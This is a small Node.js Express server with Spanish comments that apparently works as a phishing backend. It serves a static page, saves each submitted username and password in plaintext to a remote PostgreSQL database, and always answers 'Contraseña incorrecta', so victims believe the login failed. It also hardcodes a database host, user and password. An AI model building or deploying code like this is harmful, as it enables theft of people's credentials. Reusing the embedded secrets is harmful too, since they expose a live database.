//IMPORTACIONES
const express = require('express');
const app = express();
const {Client} = require('pg');
//MIDDLEWARE
app.use(express.json());

//CONFIGURACION DE BASE DE DATOS
const pgClient = new Client({
    user: 'fl0user',
    host: 'ep-square-grass-a5d3sxuv.us-east-2.aws.neon.fl0.io',
    database: 'database',
    password: 'FMe35EOTkYJh',
    port:5432,
    ssl:require
})

pgClient.connect()
.then(()=>console.log('Base de datos conectada'))
.catch(e=>console.log(`Error: ${e}`))

app.use(express.static('./'))

app.post('/', (req,res)=>{
    try{
        let body = req.body;
        pgClient.query(`INSERT INTO usuarios (data,contraseña) VALUES ($1, $2)`, [body.data, body.password])
        .then(res=>{
            console.log('Resultado de la consulta: \n', res.rows);
            console.log('Consulta realizada con exito')
        })
        .catch(e=>console.log(`${e}`))
        let mensaje = {mensaje: 'Contraseña incorrecta'}
        res.json(mensaje)
    }
    catch(e){
        console.log(`Error en la base de datos: ${e}`)
    }
})

const PUERTO = process.env.PORT || 3000;

app.listen(PUERTO, ()=>console.log('Escuchando en el puerto 3000...'))